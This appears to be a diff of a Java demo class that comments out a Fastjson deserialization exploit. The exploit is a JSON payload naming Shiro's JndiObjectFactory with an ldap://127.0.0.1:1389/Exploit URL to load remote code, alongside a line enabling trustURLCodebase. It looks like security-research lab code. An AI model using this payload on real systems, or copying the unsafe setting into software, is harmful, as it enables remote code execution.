@@ -14,11 +14,11 @@ public class AppSimple {
 
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 //        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+//        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
 
-        JSON jsonObject = JSON.parseObject(payload);
+//        JSON jsonObject = JSON.parseObject(payload);
 
-        System.out.println(jsonObject);
+//        System.out.println(jsonObject);
     }
 
     public String sayHello(String input){
